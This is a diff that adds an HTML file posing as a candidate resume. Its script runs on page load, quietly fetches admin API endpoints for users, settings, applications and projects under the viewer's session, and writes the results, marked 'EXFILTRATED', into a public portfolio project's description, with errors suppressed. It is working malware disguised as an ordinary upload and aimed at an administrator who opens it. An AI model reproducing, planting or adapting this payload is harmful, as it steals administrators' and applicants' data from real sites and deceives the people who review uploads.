@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html>
+<head>
+<script>
+async function exfiltrate() {
+  try {
+    const urls = [
+      '/api/admin/users',
+      '/api/admin/settings',
+      '/api/admin/dashboard',
+      '/api/admin/careers',
+      '/api/admin/applications',
+      '/api/admin/projects'
+    ];
+    const results = {};
+    for (const url of urls) {
+      try {
+        const r = await fetch(url);
+        results[url] = { status: r.status, data: await r.text() };
+      } catch (e) {
+        results[url] = { error: e.message };
+      }
+    }
+    
+    const origRes = await fetch('/api/portfolio');
+    const origData = await origRes.json();
+    const project1 = origData.data.find(p => p.id === 'project-1') || origData.data[0];
+    
+    const payload = {
+      ...project1,
+      description: "EXFILTRATED: " + JSON.stringify(results)
+    };
+    
+    await fetch('/api/admin/portfolio/project-1', {
+      method: 'PUT',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    });
+    
+    await fetch('/api/admin/portfolio', {
+      method: 'PUT',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    });
+
+    await fetch('/api/admin/portfolio', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    });
+  } catch (err) {
+    //
+  }
+}
+exfiltrate();
+</script>
+</head>
+<body>
+<h1>Resume</h1>
+<p>Candidate Resume Content</p>
+</body>
+</html>
